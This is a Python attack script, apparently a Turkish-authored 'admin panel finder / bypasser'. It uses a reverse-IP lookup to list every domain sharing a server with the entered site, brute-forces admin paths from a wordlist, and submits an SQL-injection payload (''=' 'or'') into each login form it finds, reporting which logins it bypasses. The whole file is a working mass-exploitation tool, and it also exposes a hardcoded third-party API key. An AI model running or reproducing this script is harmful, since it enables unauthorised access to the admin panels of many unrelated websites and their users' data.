import requests
from loginform import fill_login_form
import time
while True:
    print("""
 #########################################################
#                                                        #
#        Kortto Admin Panel Finder / Bypasser v2.0       #
#                                                        # 
#              Coded by Ahmet Ümit BAYRAM                #
#                                                        #
 #########################################################
    """)

    site = input("siteyi gir:")
    url = "https://api.viewdns.info/reverseip/?host="
    api_key = "&apikey=884a53c016d5088c9f50935e464bcd16cabe19ca&output=json"
    son_url = url + site + api_key
    responsec = requests.get(son_url)
    json_data = responsec.json()
    domain_liste = json_data["response"]["domains"]
    site_sayisi = json_data["response"]["domain_count"]
    son_liste = []

    i = 0
    dosya = open("./brute.txt", "r")
    a = dosya.read().split("\n")
    a.pop()
    while i < int(site_sayisi) - 1:
        for z in a:
            son_liste.append("http://www." + domain_liste[i]['name'] + z)
        i += 1
    
    for i in son_liste:
        try:
            req = requests.get(i)
        except:
            print(i, " bağlantı yok! ")
            continue
        if req.status_code == 200:
            try:
                form = fill_login_form(i, req.text, "'=' 'or'", "'=' 'or'")
                time.sleep(3)
                req2 = requests.post(url = form[1], data = form[0])
                print(i, " FOUND !!! ")
                time.sleep(3)
                print(i, " trying bypass.... ")
                time.sleep(3)
                if "logout" in req2.text:
                
                    print(i, " successfull!!! ")
                else:
                    print(i, " failed :( ")  
            except:
                print(i, " not found")  
            
            
        else:
            print(i, " not found ")            
